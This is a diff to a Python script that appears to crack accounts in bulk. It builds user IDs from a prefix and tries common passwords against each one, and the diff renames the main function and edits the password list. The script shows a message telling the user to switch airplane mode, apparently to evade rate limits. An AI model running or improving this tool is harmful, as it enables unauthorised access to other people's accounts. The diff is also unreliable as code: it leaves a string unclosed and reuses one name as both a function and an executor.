@@ -5,7 +5,7 @@ import requests
 import uuid
 import marshal, base64, zlib
 os.system('clear')
-def o():
+def Riyad():
     os.system('clear')
     print(logo)
     ip = requests.get("https://api.ipify.org").text
@@ -219,7 +219,7 @@ def i():
         jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE")
         print('\033[38;5;46--------------------------------------------')
         for love in user:
-            pwx = [love,'bangladesh','i love you','696969','57273200','123321','121234','889900','708090','Bangladesh','0987654']
+            pwx = [love,'bangladesh','i love you','00009999','203040','123321','121234','889900','708090','Bangladesh','0987654','258036','258025]
             uid = code+love
             Riyad.submit(rcrack,uid,pwx,tl)
     print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
@@ -284,4 +284,4 @@ def rcrack(uid,pwx,tl):
     except:
         pass
 
-o()
+Riyad()
